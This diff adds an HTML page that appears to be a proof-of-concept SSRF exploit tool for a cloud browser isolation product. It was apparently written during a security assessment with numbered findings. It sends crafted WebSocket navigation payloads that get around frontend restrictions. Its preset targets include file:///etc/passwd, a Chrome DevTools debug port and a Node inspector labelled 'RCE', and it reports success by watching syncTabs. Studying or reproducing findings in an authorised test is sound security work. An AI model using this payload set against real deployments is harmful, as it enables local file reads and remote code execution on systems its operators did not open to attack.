@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CWE-918 (SSRF) Reproduction Tool</title>
+    <style>
+        :root {
+            --bg: #1e1e2e;
+            --fg: #cdd6f4;
+            --accent: #f38ba8;
+            --border: #45475a;
+            --input-bg: #313244;
+        }
+        body {
+            font-family: system-ui, -apple-system, sans-serif;
+            background-color: var(--bg);
+            color: var(--fg);
+            max-width: 800px;
+            margin: 2rem auto;
+            padding: 0 1rem;
+            line-height: 1.5;
+        }
+        h1 { color: var(--accent); border-bottom: 2px solid var(--border); padding-bottom: 0.5rem; }
+        .card { background: var(--input-bg); padding: 1.5rem; border-radius: 8px; margin-bottom: 1.5rem; border: 1px solid var(--border); }
+        .form-group { margin-bottom: 1rem; }
+        label { display: block; margin-bottom: 0.4rem; font-weight: bold; font-size: 0.9rem; color: #a6adc8; }
+        input, select {
+            width: 100%; padding: 0.6rem; border-radius: 4px;
+            border: 1px solid var(--border); background: var(--bg); color: var(--fg);
+            font-family: monospace; box-sizing: border-box;
+        }
+        button {
+            background: var(--accent); color: #11111b; border: none;
+            padding: 0.8rem 1.5rem; font-weight: bold; border-radius: 4px;
+            cursor: pointer; width: 100%; transition: opacity 0.2s;
+        }
+        button:hover { opacity: 0.9; }
+        .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; }
+        #logs {
+            background: #11111b; color: #a6e3a1; padding: 1rem;
+            border-radius: 4px; font-family: monospace; font-size: 0.85rem;
+            height: 300px; overflow-y: auto; white-space: pre-wrap;
+        }
+        .log-sent { color: #89b4fa; }
+        .log-recv { color: #f9e2af; }
+        .log-error { color: #f38ba8; }
+        .log-info { color: #94e2d5; }
+    </style>
+</head>
+<body>
+
+    <h1>SSRF Reproduction Tool (CHAIN-01)</h1>
+    <p>This tool connects to the authenticated CBI session WebSocket and injects malicious navigation payloads bypassing frontend restrictions.</p>
+
+    <div class="card">
+        <div class="form-group">
+            <label>WebSocket URL (wss://.../socket/controls)</label>
+            <input type="text" id="wsUrl" placeholder="ws://localhost:3000/socket/controls?controls_id=..." value="ws://localhost:3000/socket/controls?controls_id=YOUR_CONTROLS_ID">
+        </div>
+        
+        <div class="grid-2">
+            <div class="form-group">
+                <label>Controls ID</label>
+                <input type="text" id="controlsId" placeholder="e.g. 6e517414-4fc1-..." value="YOUR_CONTROLS_ID">
+            </div>
+            <div class="form-group">
+                <label>Vulnerable Target Method</label>
+                <select id="subtype">
+                    <option value="restore">navigation/restore (navigateToURL)</option>
+                    <option value="open">navigation/open (openNewWindow)</option>
+                </select>
+            </div>
+        </div>
+
+        <div class="form-group">
+            <label>SSRF Payload (Target URL)</label>
+            <select id="payloadSelect" onchange="document.getElementById('targetUrl').value = this.value">
+                <option value="http://localhost:1337/metrics">1. Localhost Metrics (localhost:1337/metrics)</option>
+                <option value="file:///etc/passwd">2. Local File Read (file:///etc/passwd) -> F-004</option>
+                <option value="http://127.0.0.2:9224/json/version">3. CDP Debug (127.0.0.2:9224/json/version) -> F-005</option>
+                <option value="http://127.0.0.2:9228/json">4. Node Inspector RCE (127.0.0.2:9228/json) -> F-005</option>
+                <option value="http://localhost:1337/webviewer?file=malicious">5. Webviewer SSRF (localhost:1337/webviewer) -> F-006</option>
+            </select>
+        </div>
+
+        <div class="form-group">
+            <input type="text" id="targetUrl" value="http://localhost:1337/metrics">
+        </div>
+
+        <button id="exploitBtn">Connect & Execute SSRF</button>
+    </div>
+
+    <div class="card">
+        <label>Live Interaction Logs</label>
+        <div id="logs"></div>
+    </div>
+
+    <script>
+        const logsEl = document.getElementById('logs');
+        
+        function log(msg, type = 'info') {
+            const span = document.createElement('span');
+            span.className = `log-${type}`;
+            span.textContent = `[${new Date().toLocaleTimeString()}] ${msg}\n`;
+            logsEl.appendChild(span);
+            logsEl.scrollTop = logsEl.scrollHeight;
+        }
+
+        document.getElementById('exploitBtn').addEventListener('click', () => {
+            const wsUrl = document.getElementById('wsUrl').value;
+            const controlsId = document.getElementById('controlsId').value;
+            const subtype = document.getElementById('subtype').value;
+            const targetUrl = document.getElementById('targetUrl').value;
+
+            if (wsUrl.includes('YOUR_CONTROLS_ID')) {
+                log('Warning: It looks like you have not updated the wsUrl with a real session.', 'error');
+            }
+
+            log(`Initiating connection to ${wsUrl}...`, 'info');
+            
+            try {
+                const ws = new WebSocket(wsUrl);
+
+                ws.onopen = () => {
+                    log('WebSocket Connected successfully.', 'info');
+                    
+                    const payload = {
+                        type: "navigation",
+                        subtype: subtype,
+                        target: "endpoint",
+                        attributes: {
+                            controlsId: controlsId,
+                            url: targetUrl
+                        }
+                    };
+
+                    log(`Sending payload: ${JSON.stringify(payload)}`, 'sent');
+                    ws.send(JSON.stringify(payload));
+                    
+                    log('Payload delivered. Watch the pixel stream or logs for syncTabs to confirm navigation.', 'info');
+                };
+
+                ws.onmessage = (event) => {
+                    // Try to pretty-print JSON if possible
+                    try {
+                        const parsed = JSON.parse(event.data);
+                        log(`Received: ${JSON.stringify(parsed, null, 2)}`, 'recv');
+                        
+                        if (parsed.subtype === 'syncTabs' && parsed.attributes && parsed.attributes.tabs) {
+                            const activeTab = parsed.attributes.tabs.find(t => t.active);
+                            if (activeTab && activeTab.url) {
+                                if (activeTab.url === targetUrl) {
+                                    log(`[SUCCESS] syncTabs confirms isolated browser navigated to: ${activeTab.url}`, 'info');
+                                } else {
+                                    log(`[UPDATE] Current tab URL: ${activeTab.url}`, 'info');
+                                }
+                            }
+                        }
+                    } catch (e) {
+                        log(`Received (raw): ${event.data}`, 'recv');
+                    }
+                };
+
+                ws.onerror = (error) => {
+                    log(`WebSocket Error. Ensure the URL is correct and session is authenticated.`, 'error');
+                };
+
+                ws.onclose = (event) => {
+                    log(`WebSocket Closed (Code: ${event.code})`, 'error');
+                };
+                
+            } catch (err) {
+                log(`Failed to create WebSocket: ${err.message}`, 'error');
+            }
+        });
+    </script>
+</body>
+</html>
